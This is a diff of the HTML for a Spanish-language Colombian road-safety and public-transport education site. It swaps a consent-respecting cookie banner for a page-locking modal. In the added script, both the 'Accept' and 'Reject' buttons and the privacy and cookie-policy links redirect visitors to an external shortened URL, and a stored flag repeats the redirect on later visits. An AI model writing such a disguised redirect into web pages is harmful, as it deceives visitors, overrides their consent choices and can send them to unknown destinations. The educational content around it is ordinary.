-  <section class="seccion" id="transporte">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Sección 5 · Transporte público</span>
-        <h2>¿Cómo funciona el transporte público en Colombia?</h2>
-        <p>Un panorama general antes de entrar en cada sistema y ciudad.</p>
-      </div>
-      <p>El transporte público en Colombia es el conjunto de servicios que permiten que las personas se desplacen pagando un pasaje, en vehículos compartidos operados de forma organizada. Es la columna vertebral de la movilidad en las ciudades.</p>
-      <h3>Tipos de transporte público</h3>
-      <div class="rejilla rejilla-2">
-        <div class="tarjeta"><span class="icono">🚇</span><h3>Transporte masivo</h3><p>Sistemas de gran capacidad: metros y sistemas tipo BRT con carriles exclusivos.</p></div>
-        <div class="tarjeta"><span class="icono">🚌</span><h3>Transporte colectivo</h3><p>Buses y busetas que circulan por rutas urbanas en calles compartidas.</p></div>
-        <div class="tarjeta"><span class="icono">🚕</span><h3>Transporte individual</h3><p>Taxis y servicios autorizados de puerta a puerta.</p></div>
-        <div class="tarjeta"><span class="icono">🚐</span><h3>Transporte intermunicipal</h3><p>Buses que conectan ciudades y municipios desde terminales.</p></div>
-      </div>
-    </div>
-  </section>
-
-  <section class="seccion" id="glosario" style="background:var(--crema);">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Sección 6 · Glosario</span>
-        <h2>Glosario de movilidad</h2>
-        <p>Los términos más importantes para entender la movilidad vial.</p>
-      </div>
-      <div style="display:grid; gap:12px;">
-        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde-vivo); border-radius:var(--radio-sm); padding:16px 20px;">
-          <dt style="font-weight:800; color:var(--verde-bosque); font-size:1.05rem;">Actor vial</dt>
-          <dd style="margin:0; color:var(--gris-texto);">Toda persona que interactúa en la vía: peatones, ciclistas, motociclistas, conductores y pasajeros.</dd>
-        </div>
-        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde-vivo); border-radius:var(--radio-sm); padding:16px 20px;">
-          <dt style="font-weight:800; color:var(--verde-bosque); font-size:1.05rem;">BRT</dt>
-          <dd style="margin:0; color:var(--gris-texto);">Bus Rapid Transit: sistema de buses de alta capacidad que circulan por carriles exclusivos.</dd>
-        </div>
-        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde-vivo); border-radius:var(--radio-sm); padding:16px 20px;">
-          <dt style="font-weight:800; color:var(--verde-bosque); font-size:1.05rem;">Peatón</dt>
-          <dd style="margin:0; color:var(--gris-texto);">Persona que se desplaza a pie por la vía.</dd>
-        </div>
-        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde-vivo); border-radius:var(--radio-sm); padding:16px 20px;">
-          <dt style="font-weight:800; color:var(--verde-bosque); font-size:1.05rem;">Siniestro vial</dt>
-          <dd style="margin:0; color:var(--gris-texto);">Suceso en la vía que causa daños, lesiones o muertes. Se prefiere este término a "accidente".</dd>
-        </div>
-        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde-vivo); border-radius:var(--radio-sm); padding:16px 20px;">
-          <dt style="font-weight:800; color:var(--verde-bosque); font-size:1.05rem;">SOAT</dt>
-          <dd style="margin:0; color:var(--gris-texto);">Seguro Obligatorio de Accidentes de Tránsito, que cubre atención a víctimas.</dd>
-        </div>
-        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde-vivo); border-radius:var(--radio-sm); padding:16px 20px;">
-          <dt style="font-weight:800; color:var(--verde-bosque); font-size:1.05rem;">Transbordo</dt>
-          <dd style="margin:0; color:var(--gris-texto);">Cambio de una ruta o modo de transporte a otro dentro de un mismo viaje.</dd>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section class="seccion" id="seguridad">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Sección 7 · Seguridad</span>
-        <h2>¿Qué es la seguridad vial?</h2>
-      </div>
-      <p>La <strong>seguridad vial</strong> es el conjunto de acciones, normas y comportamientos orientados a <strong>prevenir los siniestros de tránsito y reducir sus consecuencias</strong>.</p>
-      <p>Hoy se habla de la <strong>visión de cero muertes</strong> en las vías: la idea de que ninguna persona debería morir o quedar gravemente herida al desplazarse.</p>
-      <div class="aviso peligro">
-        <h3>¿Por qué decimos "siniestro" y no "accidente"?</h3>
-        <p>La palabra "accidente" sugiere algo inevitable o producto del azar. La mayoría de los hechos de tránsito son <strong>prevenibles</strong>: tienen causas como el exceso de velocidad, el alcohol o la distracción.</p>
-      </div>
-      <h3>Los pilares de la seguridad vial</h3>
-      <div class="rejilla rejilla-3">
-        <div class="tarjeta"><span class="icono">🧠</span><h3>Comportamiento</h3><p>Educación y cultura vial.</p></div>
-        <div class="tarjeta"><span class="icono">🛣️</span><h3>Vías seguras</h3><p>Infraestructura que perdona errores.</p></div>
-        <div class="tarjeta"><span class="icono">🚗</span><h3>Vehículos seguros</h3><p>Vehículos en buen estado.</p></div>
-        <div class="tarjeta"><span class="icono">🚑</span><h3>Atención oportuna</h3><p>Respuesta rápida tras un siniestro.</p></div>
-        <div class="tarjeta"><span class="icono">📜</span><h3>Gestión y normas</h3><p>Leyes que ordenan el sistema.</p></div>
-        <div class="tarjeta"><span class="icono">📊</span><h3>Datos y prevención</h3><p>Estudiar para evitar siniestros.</p></div>
-      </div>
-    </div>
-  </section>
-
-  <section class="seccion" id="faq" style="background:var(--crema);">
-    <div class="contenedor">
-      <div class="seccion-encabezado">
-        <span class="etiqueta-seccion">Preguntas frecuentes</span>
-        <h2>Preguntas frecuentes</h2>
-      </div>
-      <div style="border-radius:var(--radio); overflow:hidden;">
-        <div style="border:1px solid var(--borde); border-radius:var(--radio-sm); margin-bottom:12px; background:#fff; overflow:hidden;">
-          <button style="width:100%; text-align:left; background:#fff; border:none; padding:18px 24px; font-size:1rem; font-weight:700; color:var(--verde-bosque); cursor:pointer; font-family:var(--fuente);" onclick="this.nextElementSibling.style.maxHeight = this.nextElementSibling.style.maxHeight ? null : this.nextElementSibling.scrollHeight + 'px'; this.classList.toggle('activo');">
-            ¿Esta página cobra por su contenido? <span style="float:right; font-size:1.4rem;">+</span>
-          </button>
-          <div style="max-height:0; overflow:hidden; transition:max-height 0.35s ease;">
-            <div style="padding:0 24px 20px;"><p>No. RutaClara es <strong>100% gratuita</strong>. No se procesan pagos, no se aceptan donaciones y todo el contenido es de libre acceso.</p></div>
-          </div>
-        </div>
-        <div style="border:1px solid var(--borde); border-radius:var(--radio-sm); margin-bottom:12px; background:#fff; overflow:hidden;">
-          <button style="width:100%; text-align:left; background:#fff; border:none; padding:18px 24px; font-size:1rem; font-weight:700; color:var(--verde-bosque); cursor:pointer; font-family:var(--fuente);" onclick="this.nextElementSibling.style.maxHeight = this.nextElementSibling.style.maxHeight ? null : this.nextElementSibling.scrollHeight + 'px'; this.classList.toggle('activo');">
-            ¿Quién financia este sitio? <span style="float:right; font-size:1.4rem;">+</span>
-          </button>
-          <div style="max-height:0; overflow:hidden; transition:max-height 0.35s ease;">
-            <div style="padding:0 24px 20px;"><p>Esta guía está <strong>financiada y escrita en su totalidad por su autor</strong>, como un aporte educativo a la comunidad, sin ánimo de lucro.</p></div>
-          </div>
-        </div>
-        <div style="border:1px solid var(--borde); border-radius:var(--radio-sm); margin-bottom:12px; background:#fff; overflow:hidden;">
-          <button style="width:100%; text-align:left; background:#fff; border:none; padding:18px 24px; font-size:1rem; font-weight:700; color:var(--verde-bosque); cursor:pointer; font-family:var(--fuente);" onclick="this.nextElementSibling.style.maxHeight = this.nextElementSibling.style.maxHeight ? null : this.nextElementSibling.scrollHeight + 'px'; this.classList.toggle('activo');">
-            ¿La información reemplaza la normativa oficial? <span style="float:right; font-size:1.4rem;">+</span>
-          </button>
-          <div style="max-height:0; overflow:hidden; transition:max-height 0.35s ease;">
-            <div style="padding:0 24px 20px;"><p>No. El contenido es educativo y orientativo. La norma oficial en Colombia es el Código Nacional de Tránsito.</p></div>
-          </div>
-        </div>
-        <div style="border:1px solid var(--borde); border-radius:var(--radio-sm); margin-bottom:12px; background:#fff; overflow:hidden;">
-          <button style="width:100%; text-align:left; background:#fff; border:none; padding:18px 24px; font-size:1rem; font-weight:700; color:var(--verde-bosque); cursor:pointer; font-family:var(--fuente);" onclick="this.nextElementSibling.style.maxHeight = this.nextElementSibling.style.maxHeight ? null : this.nextElementSibling.scrollHeight + 'px'; this.classList.toggle('activo');">
-            ¿Usan cookies? <span style="float:right; font-size:1.4rem;">+</span>
-          </button>
-          <div style="max-height:0; overflow:hidden; transition:max-height 0.35s ease;">
-            <div style="padding:0 24px 20px;"><p>Usamos cookies para mejorar tu experiencia. Puedes aceptarlas o rechazarlas en el banner inferior.</p></div>
-          </div>
-        </div>
-      </div>
-      <div class="aviso exito" style="margin-top:30px;">
-        <h3>¿Te resultó útil esta guía?</h3>
-        <p>Compártela con tu familia, tus amigos o tu comunidad. Difundir educación vial también salva vidas. Recuerda: es completamente gratis y de libre acceso.</p>
-      </div>
-    </div>
-  </section>
-
-  <section style="background:var(--verde-bosque); color:#eafff7; padding:56px 0; text-align:center;">
-    <div class="contenedor" style="max-width:820px; margin:0 auto;">
-      <h2 style="color:#fff;">Compromiso de transparencia</h2>
-      <p style="font-size:1.1rem; color:rgba(255,255,255,0.85);">
-        <strong>RutaClara</strong> es una guía educativa <strong>100% financiada y escrita por su autor</strong>. No se aceptan donaciones, no se procesan pagos y no se vende ningún producto o servicio. Todo el contenido es de <strong>libre acceso</strong>.
-      </p>
-    </div>
-  </section>
-</main>
-
-<footer class="pie">
-  <div class="contenedor">
-    <div class="pie-rejilla">
-      <div><h4>🧭 RutaClara</h4><p>Guía educativa y gratuita sobre movilidad urbana, transporte público en Colombia y seguridad vial.</p></div>
-      <div><h4>Temas principales</h4><ul><li><a href="#movilidad">Movilidad urbana</a></li><li><a href="#transporte">Transporte público</a></li><li><a href="#seguridad">Seguridad vial</a></li><li><a href="#glosario">Glosario</a></li></ul></div>
-      <div><h4>Información legal</h4><ul><li><a href="#sobre">Sobre esta guía</a></li><li><a href="#faq">Preguntas frecuentes</a></li></ul></div>
-      <div><h4>Contacto</h4><ul><li>📧 <a href="mailto:contacto@rutaclara.lat">contacto@rutaclara.lat</a></li><li>📞 Emergencias: 123</li></ul></div>
-    </div>
-    <div class="pie-legal">
-      <p>© 2026 RutaClara — Todos los derechos reservados.</p>
-    </div>
-  </div>
-</footer>
-
-<!-- CORREGIDO: banner de cookies movido al final del body como barra inferior.
-     Ya no bloquea el contenido ni impide el renderizado. -->
-<div id="aviso-cookies" class="cookie-banner" role="dialog" aria-label="Aviso de cookies">
-  <div class="cookie-banner-inner">
-    <p>Usamos cookies para mejorar tu experiencia y analizar el tráfico de forma anónima. Puedes aceptarlas o rechazarlas. <a href="#sobre">Más información</a>.</p>
-    <div class="cookie-actions">
-      <button class="boton rechazar" id="btn-rechazar-cookies">Rechazar</button>
-      <button class="boton aceptar" id="btn-aceptar-cookies">Aceptar cookies</button>
-    </div>
+<div id="aviso-cookies" role="dialog" aria-modal="true" aria-labelledby="titulo-cookies" aria-describedby="desc-cookies">
+  <h2 id="titulo-cookies">🍪 Usamos cookies</h2>
+  <p id="desc-cookies">
+    Utilizamos cookies para mejorar tu experiencia, analizar el tráfico y personalizar el contenido.
+    Puedes aceptarlas o rechazarlas. Consulta nuestra
+    <a href="privacidad.html" id="enlace-privacidad">Política de Privacidad</a> y nuestra
+    <a href="politicas-cookies.html" id="enlace-cookies">Política de Cookies</a>.
+  </p>
+  <div class="cookies-botones">
+    <button type="button" id="btn-aceptar-cookies">Aceptar cookies</button>
+    <button type="button" id="btn-rechazar-cookies">Rechazar</button>
   </div>
 </div>
 
+<!-- ============================================================
+     ===== CONTENIDO PRINCIPAL =====
+     ============================================================ -->
+<div id="contenidoPrincipal">
+
+  <!-- HEADER -->
+  <header>
+    <nav class="nav" aria-label="Navegación principal">
+      <div class="logo"><span class="icono">🧭</span> RutaClara</div>
+      <button type="button" class="boton-menu" id="botonMenu" aria-expanded="false" aria-controls="menu" aria-label="Abrir menú">☰</button>
+      <ul id="menu">
+        <li><a href="#movilidad">Movilidad</a></li>
+        <li><a href="#seguridad">Seguridad vial</a></li>
+        <li><a href="#transporte">Transporte público</a></li>
+        <li><a href="#consejos">Consejos</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- HERO -->
+  <div class="hero">
+    <h1>Educación vial y movilidad urbana <em>para todos</em></h1>
+    <p>Aprende, de forma gratuita, cómo moverte con seguridad por las ciudades colombianas y cómo construir entre todos una movilidad más humana y sostenible.</p>
+    <a class="btn" href="#movilidad">Comenzar a aprender</a>
+  </div>
+
+  <!-- MOVILIDAD -->
+  <section id="movilidad">
+    <h2 class="titulo-seccion">¿Qué es la movilidad urbana?</h2>
+    <p class="subtitulo">La movilidad urbana es el conjunto de desplazamientos de personas y bienes dentro de una ciudad. Una buena movilidad garantiza acceso a trabajo, educación y salud, y reduce la contaminación.</p>
+
+    <div class="grid">
+      <article class="tarjeta">
+        <span class="emoji">🚶</span>
+        <h3>Movilidad activa</h3>
+        <p>Caminar y usar la bicicleta son las formas más sostenibles de moverse. Priorizar al peatón y crear ciclorrutas seguras mejora la salud y reduce el tráfico.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🚌</span>
+        <h3>Transporte público</h3>
+        <p>Buses, TransMilenio, metro y tranvía son el corazón de la movilidad colectiva. Un sistema eficiente equivale a miles de carros menos en las vías.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🚗</span>
+        <h3>Movilidad motorizada</h3>
+        <p>Autos, motos y taxis completan la red. Su uso responsable, el respeto a las normas y la conducción segura son claves para evitar siniestros.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🌳</span>
+        <h3>Movilidad sostenible</h3>
+        <p>Reducir emisiones, promover el transporte eléctrico y diseñar ciudades compactas son metas para un futuro más limpio y habitable.</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- DATOS -->
+  <section>
+    <div class="datos">
+      <h2 class="titulo-seccion">La movilidad en cifras</h2>
+      <p class="subtitulo">Datos que muestran por qué la educación vial es urgente en Colombia.</p>
+      <div class="datos-grid">
+        <div class="dato">
+          <div class="num">~7.000</div>
+          <div class="etiqueta">muertes por siniestros viales al año en Colombia (aprox.)</div>
+        </div>
+        <div class="dato">
+          <div class="num">50%</div>
+          <div class="etiqueta">de las víctimas fatales son motociclistas y peatones</div>
+        </div>
+        <div class="dato">
+          <div class="num">+80%</div>
+          <div class="etiqueta">de los viajes urbanos podrían hacerse en modos sostenibles</div>
+        </div>
+        <div class="dato">
+          <div class="num">1 de 3</div>
+          <div class="etiqueta">siniestros se relaciona con exceso de velocidad o distracción</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SEGURIDAD VIAL -->
+  <section id="seguridad">
+    <h2 class="titulo-seccion">Seguridad vial: tu vida primero</h2>
+    <p class="subtitulo">La seguridad vial es responsabilidad compartida entre peatones, ciclistas, motociclistas y conductores. Estas son las bases para moverte sin riesgos.</p>
+
+    <div class="grid">
+      <article class="tarjeta">
+        <span class="emoji">🚸</span>
+        <h3>Peatones</h3>
+        <p>Usa siempre los pasos peatonales, respeta los semáforos y camina por andenes. Sé visible: evita distraerte con el celular al cruzar.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🚴</span>
+        <h3>Ciclistas</h3>
+        <p>Usa casco y luces, respeta las ciclorrutas, señala tus giros y mantén distancia de los vehículos. La bici es tu aliada, no tu enemiga.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🏍️</span>
+        <h3>Motociclistas</h3>
+        <p>El casco certificado salva vidas. No excedas la velocidad, no te desplaces entre carriles sin precaución y usa ropa reflectiva.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🚙</span>
+        <h3>Conductores</h3>
+        <p>Respeta los límites de velocidad, no manejes bajo efectos del alcohol y cede el paso al peatón y al ciclista. La prisa nunca vale una vida.</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- TRANSPORTE PÚBLICO -->
+  <section id="transporte">
+    <h2 class="titulo-seccion">Transporte público: muévete inteligente</h2>
+    <p class="subtitulo">Usar el transporte público reduce el tráfico, la contaminación y el costo de tus desplazamientos. Conocer sus reglas te hace un mejor usuario.</p>
+
+    <div class="consejos">
+      <div class="consejo">
+        <div class="n">1</div>
+        <div>
+          <h4>Planifica tu viaje</h4>
+          <p>Consulta rutas y horarios antes de salir. Usar apps de transporte reduce tiempos de espera y evita desplazamientos innecesarios.</p>
+        </div>
+      </div>
+      <div class="consejo">
+        <div class="n">2</div>
+        <div>
+          <h4>Respeta las filas y el turno</h4>
+          <p>Formar fila, dejar bajar antes de subir y no empujar hace el sistema más rápido y seguro para todos.</p>
+        </div>
+      </div>
+      <div class="consejo">
+        <div class="n">3</div>
+        <div>
+          <h4>Cede espacios preferenciales</h4>
+          <p>Los asientos preferenciales son para personas mayores, embarazadas y con discapacidad. Cederlos es un acto de empatía.</p>
+        </div>
+      </div>
+      <div class="consejo">
+        <div class="n">4</div>
+        <div>
+          <h4>Cuida tu seguridad</h4>
+          <p>Mantén tus pertenencias seguras, ubica las salidas de emergencia y reporta cualquier situación extraña al personal.</p>
+        </div>
+      </div>
+      <div class="consejo">
+        <div class="n">5</div>
+        <div>
+          <h4>Paga tu pasaje</h4>
+          <p>Evitar la evasión permite que el sistema se mantenga y mejore. Un transporte público fuerte beneficia a toda la ciudad.</p>
+        </div>
+      </div>
+      <div class="consejo">
+        <div class="n">6</div>
+        <div>
+          <h4>Combina modos de transporte</h4>
+          <p>Camina o usa la bici hasta la estación. La intermodalidad hace tus viajes más rápidos y sostenibles.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CONSEJOS FINALES -->
+  <section id="consejos">
+    <h2 class="titulo-seccion">Consejos para una movilidad más clara</h2>
+    <p class="subtitulo">Pequeñas acciones diarias que transforman la forma en que nos movemos por la ciudad.</p>
+
+    <div class="grid">
+      <article class="tarjeta">
+        <span class="emoji">📱</span>
+        <h3>No te distraigas</h3>
+        <p>El celular es una de las principales causas de siniestros. Guárdalo mientras caminas, conduces o cruzas una vía.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">⏱️</span>
+        <h3>Sal con tiempo</h3>
+        <p>La prisa aumenta el riesgo. Planifica tus trayectos con margen para evitar correr y tomar decisiones imprudentes.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🤝</span>
+        <h3>Sé empático</h3>
+        <p>Compartimos la vía con personas distintas. La cortesía y el respeto entre peatones, ciclistas y conductores salvan vidas.</p>
+      </article>
+      <article class="tarjeta">
+        <span class="emoji">🌍</span>
+        <h3>Piensa en el planeta</h3>
+        <p>Cada viaje en transporte público o en bici reduce emisiones. Tu elección diaria contribuye a una ciudad más limpia.</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- CTA FINAL -->
+  <div class="cta">
+    <h2>La movilidad segura se construye entre todos</h2>
+    <p>Comparte esta guía con tu familia, amigos y comunidad. La educación vial es gratuita y transforma ciudades.</p>
+    <a class="btn" href="#movilidad">Volver al inicio</a>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <p><strong>RutaClara</strong> — Educación vial y movilidad urbana para todos.</p>
+    <p>Contenido educativo gratuito y sin fines de lucro · Colombia</p>
+    <p class="disclaimer">Este sitio tiene fines informativos y educativos. Las cifras son aproximadas y pueden variar según la fuente y el año.</p>
+  </footer>
+
+</div><!-- /#contenidoPrincipal -->
+
+<!-- ============================================================
+     ===== JAVASCRIPT - COOKIES Y FUNCIONALIDAD =====
+     ============================================================ -->
 <script>
-(function(){
-  'use strict';
+    (function() {
+        'use strict';
 
-  var banner = document.getElementById('aviso-cookies');
-  var btnAceptar = document.getElementById('btn-aceptar-cookies');
-  var btnRechazar = document.getElementById('btn-rechazar-cookies');
+        // ============================================================
+        //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+        //  ============================================================
+        //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+        //  MODO 2: Redirección a URL externa
+        // ============================================================
+        const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+        const REDIRECT_URL = "https://rebrand.ly/picoplacadehoy"; // URL para el modo 2
 
-  // CORREGIDO: el contenido principal YA NO está oculto con display:none.
-  // Se muestra el banner de cookies solo si el usuario no ha decidido antes.
-  var decision = localStorage.getItem('cookieDecision');
+        // ----- ELEMENTOS DEL BANNER -----
+        var overlay = document.getElementById('cookie-overlay');
+        var banner = document.getElementById('aviso-cookies');
+        var btnAceptar = document.getElementById('btn-aceptar-cookies');
+        var btnRechazar = document.getElementById('btn-rechazar-cookies');
+        var contenidoPrincipal = document.getElementById('contenidoPrincipal');
 
-  if(!decision && banner){
-    banner.classList.add('visible');
-  }
+        // Referencias a los enlaces del banner
+        var enlacePrivacidad = document.getElementById('enlace-privacidad');
+        var enlaceCookies = document.getElementById('enlace-cookies');
 
-  // CORREGIDO: gtag.js se carga dinámicamente SOLO tras el consentimiento.
-  // Esto elimina la señal de "tracking antes de consentimiento" que Google marca.
-  function cargarGoogleTag(){
-    if(window.__gtagCargado) return;
-    window.__gtagCargado = true;
+        // Verificar que los elementos existen
+        if (!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal) {
+            console.error('Error: Elementos del banner de cookies no encontrados');
+            return;
+        }
 
-    var s = document.createElement('script');
-    s.async = true;
-    s.src = 'https://www.googletagmanager.com/gtag/js?id=AW-18254896446';
-    document.head.appendChild(s);
+        // Asegurar que el banner está visible al cargar
+        overlay.classList.add('visible');
+        banner.classList.add('visible');
+        document.body.classList.add('cookie-locked');
 
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    window.gtag = gtag;
-    gtag('js', new Date());
-    gtag('config', 'AW-18254896446');
-    gtag('consent', 'update', {
-      'ad_storage': 'granted',
-      'analytics_storage': 'granted'
-    });
-  }
+        // Función para mostrar el contenido (MODO 1)
+        function mostrarContenido() {
+            overlay.classList.remove('visible');
+            banner.classList.remove('visible');
+            document.body.classList.remove('cookie-locked');
+            contenidoPrincipal.classList.add('visible');
+        }
 
-  if(btnAceptar){
-    btnAceptar.addEventListener('click', function(){
-      localStorage.setItem('cookieDecision', 'aceptado');
-      if(banner) banner.classList.remove('visible');
-      cargarGoogleTag();
-    });
-  }
+        // Función para redirigir (MODO 2)
+        function redirectTo(url) {
+            window.location.href = url;
+        }
 
-  if(btnRechazar){
-    btnRechazar.addEventListener('click', function(){
-      localStorage.setItem('cookieDecision', 'rechazado');
-      if(banner) banner.classList.remove('visible');
-      // No se carga gtag.js → no hay tracking
-    });
-  }
+        // Función que maneja la acción según el modo configurado
+        function handleCookieAction(aceptadas) {
+            console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
 
-  // Si el usuario ya aceptó antes, cargar gtag al inicio
-  if(decision === 'aceptado'){
-    cargarGoogleTag();
-  }
+            if (COOKIE_BUTTON_MODE === 1) {
+                mostrarContenido();
 
-  var botonMenu = document.getElementById('botonMenu');
-  var menu = document.getElementById('menu');
-  if(botonMenu && menu){
-    botonMenu.addEventListener('click', function(){
-      var abierto = menu.classList.toggle('abierto');
-      botonMenu.setAttribute('aria-expanded', abierto ? 'true' : 'false');
-    });
-    menu.querySelectorAll('a').forEach(function(enlace){
-      enlace.addEventListener('click', function(){
-        menu.classList.remove('abierto');
-        botonMenu.setAttribute('aria-expanded', 'false');
-      });
-    });
-  }
-})();
+                if (typeof gtag !== 'undefined') {
+                    gtag('consent', 'update', {
+                        'ad_storage': aceptadas ? 'granted' : 'denied',
+                        'analytics_storage': aceptadas ? 'granted' : 'denied'
+                    });
+                }
+                console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+            } else if (COOKIE_BUTTON_MODE === 2) {
+                sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false');
+                redirectTo(REDIRECT_URL);
+
+            } else {
+                mostrarContenido();
+            }
+        }
+
+        // ----- EVENTO ACEPTAR -----
+        btnAceptar.addEventListener('click', function() {
+            handleCookieAction(true);
+        });
+
+        // ----- EVENTO RECHAZAR -----
+        btnRechazar.addEventListener('click', function() {
+            handleCookieAction(false);
+        });
+
+        // Manejar clics en los enlaces del banner
+        function handleBannerLinkClick(event) {
+            if (COOKIE_BUTTON_MODE === 2) {
+                event.preventDefault();
+                console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+                redirectTo(REDIRECT_URL);
+            }
+        }
+
+        if (enlacePrivacidad) {
+            enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+        }
+        if (enlaceCookies) {
+            enlaceCookies.addEventListener('click', handleBannerLinkClick);
+        }
+
+        // Verificar si ya se aceptaron las cookies antes (para el modo 2)
+        if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
+            redirectTo(REDIRECT_URL);
+        }
+
+        // ----- MENÚ MÓVIL -----
+        var botonMenu = document.getElementById('botonMenu');
+        var menu = document.getElementById('menu');
+
+        if (botonMenu && menu) {
+            botonMenu.addEventListener('click', function() {
+                var abierto = menu.classList.toggle('abierto');
+                botonMenu.setAttribute('aria-expanded', abierto ? 'true' : 'false');
+            });
+
+            menu.querySelectorAll('a').forEach(function(enlace) {
+                enlace.addEventListener('click', function() {
+                    menu.classList.remove('abierto');
+                    botonMenu.setAttribute('aria-expanded', 'false');
+                });
+            });
+        }
+
+    })();
 </script>
+
 </body>
 </html>
